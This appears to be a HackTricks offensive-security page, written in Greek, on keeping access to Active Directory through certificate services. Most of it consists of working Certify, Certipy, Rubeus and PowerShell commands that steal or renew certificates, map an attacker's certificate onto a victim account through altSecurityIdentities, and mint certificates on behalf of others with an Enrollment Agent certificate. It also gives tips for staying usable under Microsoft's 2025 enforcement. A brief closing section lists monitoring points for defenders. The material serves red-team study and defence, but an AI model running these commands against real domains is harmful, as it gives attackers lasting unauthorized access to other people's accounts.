# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια σύντομη περίληψη των κεφαλαίων account persistence της εξαιρετικής έρευνας από [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Understanding Active User Credential Theft with Certificates – PERSIST1

Σε ένα σενάριο όπου ένα certificate που επιτρέπει domain authentication μπορεί να ζητηθεί από έναν user, ένας attacker έχει την ευκαιρία να ζητήσει και να κλέψει αυτό το certificate, ώστε να διατηρήσει persistence σε ένα network. Από προεπιλογή, το `User` template στο Active Directory επιτρέπει τέτοια requests, αν και μερικές φορές μπορεί να είναι disabled.<sup>[[3]](#references)[[7]](#references)</sup>

Χρησιμοποιώντας τα [Certify](https://github.com/GhostPack/Certify) ή [Certipy](https://github.com/ly4k/Certipy), μπορείτε να αναζητήσετε enabled templates που επιτρέπουν client authentication και στη συνέχεια να ζητήσετε ένα:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Η ισχύς ενός certificate έγκειται στην ικανότητά του να πραγματοποιεί authentication ως ο χρήστης στον οποίο ανήκει, ανεξάρτητα από τις αλλαγές κωδικού πρόσβασης, όσο το certificate παραμένει έγκυρο.

Μπορείτε να μετατρέψετε ένα PEM σε PFX και να το χρησιμοποιήσετε για να αποκτήσετε ένα TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Σημείωση: Σε συνδυασμό με άλλες τεχνικές (βλ. ενότητες THEFT), η authentication μέσω certificates επιτρέπει persistent access χωρίς να αγγίζει το LSASS και ακόμη και από non-elevated contexts.

## Απόκτηση Machine Persistence με Certificates - PERSIST2

Εάν ένας attacker έχει elevated privileges σε ένα host, μπορεί να εγγράψει το machine account του compromised system για ένα certificate χρησιμοποιώντας το default `Machine` template. Η authentication ως το machine επιτρέπει S4U2Self για local services και μπορεί να παρέχει durable host persistence:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Επέκταση της Persistence μέσω ανανέωσης πιστοποιητικού - PERSIST3

Η κατάχρηση των περιόδων ισχύος και ανανέωσης των προτύπων πιστοποιητικών επιτρέπει σε έναν attacker να διατηρεί μακροπρόθεσμη πρόσβαση. Εάν διαθέτετε ένα πιστοποιητικό που έχει εκδοθεί προηγουμένως και το private key του, μπορείτε να το ανανεώσετε πριν από τη λήξη του, ώστε να αποκτήσετε ένα νέο credential μακράς διάρκειας χωρίς να αφήσετε πρόσθετα artifacts αιτήματος που συνδέονται με το αρχικό principal.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Επιχειρησιακή συμβουλή: Παρακολουθείτε τη διάρκεια ζωής των αρχείων PFX που διατηρεί ο attacker και ανανεώνετέ τα έγκαιρα. Η ανανέωση μπορεί επίσης να έχει ως αποτέλεσμα τα ενημερωμένα certificates να περιλαμβάνουν το modern SID mapping extension, διατηρώντας τα usable υπό αυστηρότερους κανόνες DC mapping (δείτε την επόμενη ενότητα).

## Εγκατάσταση Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Αν μπορείτε να γράψετε στο attribute `altSecurityIdentities` ενός target account, μπορείτε να κάνετε explicit mapping ενός certificate που ελέγχετε προς αυτόν τον account. Αυτό παραμένει μετά από αλλαγές κωδικού πρόσβασης και, όταν χρησιμοποιούνται strong mapping formats, εξακολουθεί να λειτουργεί υπό το modern DC enforcement.<sup>[[2]](#references)</sup>

Ροή υψηλού επιπέδου:

1. Αποκτήστε ή εκδώστε ένα client-auth certificate που ελέγχετε (π.χ. κάντε enroll στο `User` template ως ο εαυτός σας).
2. Εξαγάγετε ένα strong identifier από το cert (Issuer+Serial, SKI ή SHA1-PublicKey).
3. Προσθέστε ένα explicit mapping στο `altSecurityIdentities` του victim principal χρησιμοποιώντας αυτό το identifier.
4. Κάντε authenticate με το certificate σας· το DC θα το αντιστοιχίσει στον victim μέσω του explicit mapping.

Παράδειγμα (PowerShell) με χρήση strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Στη συνέχεια, κάντε authenticate με το PFX σας. Το Certipy θα λάβει απευθείας ένα TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Δημιουργία ισχυρών αντιστοιχίσεων `altSecurityIdentities`

Στην πράξη, οι αντιστοιχίσεις **Issuer+Serial** και **SKI** είναι οι ευκολότερες ισχυρές μορφές που μπορούν να δημιουργηθούν από ένα certificate που έχει στην κατοχή του ο attacker. Αυτό έχει σημασία μετά τις **11 Φεβρουαρίου 2025**, όταν τα DCs χρησιμοποιούν από προεπιλογή το **Full Enforcement** και οι weak αντιστοιχίσεις παύουν να είναι αξιόπιστες.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Σημειώσεις
- Χρησιμοποιείτε μόνο strong mapping types: `X509IssuerSerialNumber`, `X509SKI` ή `X509SHA1PublicKey`. Τα weak formats (Subject/Issuer, Subject-only, RFC822 email) είναι deprecated και μπορούν να αποκλειστούν από την πολιτική του DC.
- Το mapping λειτουργεί τόσο σε **user** όσο και σε **computer** objects, επομένως η write access στο `altSecurityIdentities` ενός computer account αρκεί για να διατηρήσετε persistence ως αυτό το machine.
- Η certificate chain πρέπει να καταλήγει σε root που είναι trusted από το DC. Τα Enterprise CAs στο NTAuth είναι συνήθως trusted· ορισμένα περιβάλλοντα εμπιστεύονται επίσης public CAs.
- Το Schannel authentication παραμένει χρήσιμο για persistence ακόμη και όταν το PKINIT αποτυγχάνει, επειδή το DC δεν διαθέτει το Smart Card Logon EKU ή επιστρέφει `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ explicit mappings `Issuer/SID`

Σε **Windows Server 2022+** domain controllers με εγκατεστημένο το security update της **9ης Σεπτεμβρίου 2025**, η Microsoft πρόσθεσε ένα ακόμη strong explicit mapping format, το οποίο είναι ελκυστικό για persistence επειδή επιβιώνει από certificate reissuance από το ίδιο CA:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Λειτουργικά, αυτό διαφέρει από τα παλαιότερα strong formats:
- Το `Issuer+Serial` αντιστοιχίζει **ένα συγκεκριμένο certificate**.
- Τα `SKI` / `SHA1-PUKEY` αντιστοιχίζουν **ένα keypair**.
- Το `Issuer/SID` αντιστοιχίζει **το issuing CA + το SID του target**, επομένως τα renewed ή reissued certificates από το ίδιο CA συνεχίζουν να λειτουργούν χωρίς επανεγγραφή του `altSecurityIdentities`.

Απαιτήσεις και caveats
- Το certificate που παρουσιάζεται για logon πρέπει πράγματι να περιέχει το SID του target account στο SID security extension.
- Αυτό το format δεν είναι χρήσιμο για certificates τύπου `ESC9` / `ESC16` που παραλείπουν το SID extension· σε αυτές τις περιπτώσεις χρησιμοποιήστε `Issuer+Serial`, `SKI` ή `SHA1-PUKEY`.

Για περισσότερα σχετικά με weak explicit mappings και attack paths, δείτε:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent ως Persistence – PERSIST5

Αν αποκτήσετε ένα έγκυρο Certificate Request Agent/Enrollment Agent certificate, μπορείτε να εκδίδετε νέα logon-capable certificates εκ μέρους χρηστών κατά βούληση και να διατηρείτε το agent PFX offline ως persistence token. Abuse workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Απαιτείται η ανάκληση του agent certificate ή των δικαιωμάτων του template για την εκδίωξη αυτής της persistence.

Σημειώσεις λειτουργίας
- Οι σύγχρονες εκδόσεις του `Certipy` υποστηρίζουν τόσο τα `-on-behalf-of` όσο και `-renew`, επομένως ένας attacker που διαθέτει ένα Enrollment Agent PFX μπορεί να δημιουργήσει και αργότερα να ανανεώσει leaf certificates χωρίς να χρειαστεί να αγγίξει ξανά τον αρχικό λογαριασμό-στόχο.<sup>[[4]](#references)</sup>
- Αν η ανάκτηση TGT μέσω PKINIT δεν είναι δυνατή, το resulting on-behalf-of certificate εξακολουθεί να μπορεί να χρησιμοποιηθεί για Schannel authentication με `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Χρήση Persisted Certificates Όταν Αποτυγχάνει το PKINIT

Αν ο DC δεν διαθέτει certificate με δυνατότητα Smart Card Logon, το certificate logon μέσω PKINIT μπορεί να αποτύχει με `KDC_ERR_PADATA_TYPE_NOSUPP`. Αυτό **δεν** εξουδετερώνει το persistence primitive: το ίδιο PFX συχνά εξακολουθεί να μπορεί να χρησιμοποιηθεί για Schannel-authenticated LDAP access.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Αυτό είναι ιδιαίτερα χρήσιμο μετά τα PERSIST4/PERSIST5, επειδή μπορείτε να συνεχίσετε να εργάζεστε από Linux/macOS και να συνδυάσετε άλλες ενέργειες persistence στον κατάλογο, όπως την τοποθέτηση [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ή την επεξεργασία writable delegation attributes.

## 2025 Strong Certificate Mapping Enforcement: Επιπτώσεις στο Persistence

Το Microsoft KB5014754 εισήγαγε το Strong Certificate Mapping Enforcement στους domain controllers. Από τις **11 Φεβρουαρίου 2025**, οι DC χρησιμοποιούν από προεπιλογή **Full Enforcement** για weak/ambiguous mappings και, από το security update της **9ης Σεπτεμβρίου 2025**, οι patched DC δεν υποστηρίζουν πλέον το παλιό fallback του Compatibility mode.<sup>[[1]](#references)</sup> Πρακτικές επιπτώσεις:

- Τα certificates πριν από το 2022 που δεν διαθέτουν το SID mapping extension ενδέχεται να αποτυγχάνουν στο implicit mapping όταν οι DC βρίσκονται σε Full Enforcement. Οι attackers μπορούν να διατηρήσουν την πρόσβαση είτε ανανεώνοντας certificates μέσω AD CS, ώστε να αποκτήσουν το SID extension, είτε τοποθετώντας ένα strong explicit mapping στο `altSecurityIdentities` (PERSIST4).
- Τα explicit mappings που χρησιμοποιούν strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` και, σε modern DC, `Issuer/SID`) συνεχίζουν να λειτουργούν. Τα weak formats (Issuer/Subject, Subject-only, RFC822) μπορούν να αποκλειστούν και θα πρέπει να αποφεύγονται για persistence.
- Αν τα weak mappings φαίνεται να συνεχίζουν να λειτουργούν, θεωρήστε ότι συναντήσατε έναν unpatched ή διαφορετικά configured DC και όχι μια αξιόπιστη διαδρομή persistence μακράς διάρκειας.
- Οι διαδρομές έκδοσης τύπου `ESC9` / `ESC16`, οι οποίες suppress το SID extension, καθιστούν το `Issuer/SID` μη usable. Επομένως, η πρακτική επιλογή persistence είναι η χρήση fallback strong mappings ή η ανανέωση μέσω normal template.

Οι administrators θα πρέπει να παρακολουθούν και να δημιουργούν alerts για:
- Αλλαγές στο `altSecurityIdentities` και issuance/renewals των Enrollment Agent και User certificates.
- Τα CA issuance logs για on-behalf-of requests και ασυνήθιστα renewal patterns.

## References

- [1] [Microsoft Support – KB5014754: Αλλαγές στο certificate-based authentication σε Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
